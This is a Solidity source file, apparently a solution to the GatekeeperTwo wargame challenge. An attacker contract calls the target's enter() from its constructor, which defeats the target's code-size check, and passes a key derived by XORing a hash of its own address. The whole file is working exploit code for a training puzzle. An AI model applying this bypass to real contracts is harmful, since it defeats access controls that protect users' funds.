// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {

    constructor(address _gatekeeperTwo) public {
        bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(uint64(0) - 1);
        (bool success,) = _gatekeeperTwo.call(abi.encodeWithSignature('enter(bytes8)', key));

        if(!success) revert("cannot enter");
    }
}

